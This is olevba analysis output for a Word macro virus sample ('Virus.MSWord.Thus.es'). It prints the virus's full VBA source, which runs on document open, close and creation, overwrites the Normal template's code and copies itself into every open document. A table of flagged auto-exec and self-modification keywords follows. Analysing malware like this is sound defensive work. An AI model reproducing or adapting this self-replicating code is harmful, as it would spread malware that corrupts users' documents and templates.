olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.es
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thus.es - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'AVA_001'
    On Error Resume Next
    'Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVA_001'" Then
      MsgBox ("no 'AVA_001' in normal")
      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
      .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
      .CodeModule.CountOfLines + 100
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  H
End Sub
Private Sub T()
  Application.OnTime When:=Now + TimeValue("00:00:05"), Name:="normal.ThisDocument.H"
End Sub
Private Sub H()
  T1
End Sub
Private Sub T1()
  'Normal.ThisDocument.H
  Application.OnTime When:=Now, Name:="normal.ThisDocument.T"
End Sub
Private Sub Document_Close()
  On Error Resume Next
  For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVA_001'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
      Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
      .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
      .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
      .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
  Next k
End Sub
Private Sub Document_New()
    Document_Open
End Sub



























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

